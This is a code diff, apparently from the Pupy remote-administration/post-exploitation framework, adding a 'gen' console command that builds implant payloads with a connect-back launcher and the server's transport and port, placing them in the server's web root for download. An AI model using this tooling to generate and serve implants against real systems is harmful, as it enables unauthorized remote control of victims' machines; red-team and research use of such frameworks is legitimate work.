@@ -46,6 +46,8 @@ import copy
 from functools import partial
 from threading import Event
 
+import pupygen
+
 def color_real(s, color, prompt=False, colors_enabled=True):
     """ color a string using ansi escape characters. set prompt to true to add marks for readline to see invisible portions of the prompt
     cf. http://stackoverflow.com/questions/9468435/look-how-to-fix-column-calculation-in-python-readline-if-use-color-prompt"""
@@ -762,6 +764,29 @@ class PupyCmd(cmd.Cmd):
             self.config.save(project=commands.write_project, user=commands.write_user)
             if commands.restart:
                 self.do_restart(None)
+
+    def do_gen(self, arg):
+        """ Generate payload with pupygen.py """
+
+        arg_parser = pupygen.get_parser(PupyArgumentParser)
+        arg_parser.add_argument('-L', '--launcher', default='connect', help='Launcher')
+        arg_parser.add_argument('-t', '--transport', default=self.pupsrv.transport, help='Transport')
+        arg_parser.add_argument(
+            'launcher_args', nargs=REMAINDER,
+            default=self.pupsrv.transport_kwargs, help='Transport args'
+        )
+
+        try:
+            args = arg_parser.parse_args(shlex.split(arg))
+        except PupyModuleExit:
+            return
+
+        if not args.output_dir:
+            args.output_dir = self.config.get_folder('wwwroot')
+
+        args.default_port = self.pupsrv.port
+
+        pupygen.pupygen(args)
 
     def do_dnscnc(self, arg):
         """ DNSCNC commands """
